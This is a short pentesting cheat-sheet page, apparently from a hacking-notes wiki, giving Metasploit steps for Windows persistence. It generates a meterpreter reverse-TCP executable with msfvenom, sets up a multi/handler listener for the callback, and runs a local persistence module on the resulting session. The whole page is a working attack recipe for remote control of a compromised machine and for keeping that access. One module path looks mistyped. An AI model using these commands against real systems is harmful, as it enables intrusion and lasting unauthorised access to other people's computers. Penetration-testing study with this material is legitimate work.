---
description: Use metasploit to set persistance
---

# Persistence (metasploit)

{% code overflow="wrap" %}
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe
```
{% endcode %}

Transfer payload to target

```sh
msfconsole

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set LHOST <IP>

set LPORT <PORT>

run

#When connected
background
```

On the machine start the shell.exe

```sh
#After background
use exploit/exploit/local/persistence

set session <ID>

run
```

And TADA!
